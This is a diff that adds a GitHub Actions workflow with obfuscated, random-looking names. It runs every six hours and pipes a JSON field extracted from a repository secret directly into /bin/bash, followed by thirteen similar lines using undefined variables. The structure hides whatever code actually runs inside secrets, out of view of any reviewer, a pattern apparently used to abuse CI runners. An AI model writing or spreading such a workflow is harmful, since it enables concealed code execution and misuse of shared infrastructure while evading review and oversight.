@@ -1,0 +1,30 @@
+name: fenbicesuok
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '37 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fenbicesuok
+        env:
+          yqtz43175: ${{ secrets.yqtz43175 }}
+        run: |
+          echo $yqtz43175 | jq -r .dmwzr89 | /bin/bash
+          echo $fumhu84 | jq -r .qtd71699 | /bin/bash
+          echo $n0 | jq -r .wbeo198 | /bin/bash
+          echo $opzg98080 | jq -r .rtkv40306 | /bin/bash
+          echo $rdkr2747 | jq -r .fn7 | /bin/bash
+          echo $tp0 | jq -r .tvajr3 | /bin/bash
+          echo $kd81 | jq -r .supk75 | /bin/bash
+          echo $uwi4592 | jq -r .uxqqw143 | /bin/bash
+          echo $yxdz33302 | jq -r .lulci9298 | /bin/bash
+          echo $xqbb599 | jq -r .nbjnv9 | /bin/bash
+          echo $anb23 | jq -r .p996 | /bin/bash
+          echo $unzff4592 | jq -r .tonp28480 | /bin/bash
+          echo $i763 | jq -r .vyq1405 | /bin/bash
+          echo $uo4664 | jq -r .f5 | /bin/bash
+
